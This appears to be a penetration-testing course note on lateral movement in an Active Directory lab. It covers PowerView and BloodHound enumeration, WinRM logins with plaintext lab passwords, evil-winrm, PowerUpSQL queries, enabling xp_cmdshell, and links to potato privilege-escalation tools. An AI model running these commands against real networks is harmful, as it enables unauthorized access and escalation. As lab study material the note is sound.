## Lateral Movement
If we take over an account with local admin rights over a host, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.

- RDP
- PowerShell Remoting (WinRM)
- MSSQL Server

Use BloodHound to find:
- CanRDP
- CanPSRemote
- SQLAdmin

## Remote Desktop

**Enumerating the Remote Desktop Users Group
```
Import-Module .\PowerView.ps1
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

**Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
BloodHound > Node Info > Local Admin Rights
- If we gain control over a user via LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound and check remote access rights under Execution Rights under Node Info


## WinRM

**Enumerating the Remote Management Group
```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

**Raw BloodHound query
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

**Establishing WinRM Session from Windows
```
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
Exit-PSSession
```

**Installing Evil-WinRM
```
gem install evil-winrm
```

**Connecting to a Target with Evil-WinRM and Valid Credentials
```
evil-winrm -i 10.129.201.234 -u forend
```


## SQL Server Admin
```cypher - BloodHound
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

**Enumerating MSSQL Instances with PowerUpSQL
```
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

**mssqlclient from Linux
```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
enable_xp_cmdshell
```

**Enumerating Rights on the System using xp_cmdshell
```
whoami /priv
```
SeImpersonatePrivilege tools:
- https://github.com/ohpe/juicy-potato
- https://github.com/itm4n/PrintSpoofer
- https://github.com/antonioCoco/RoguePotato
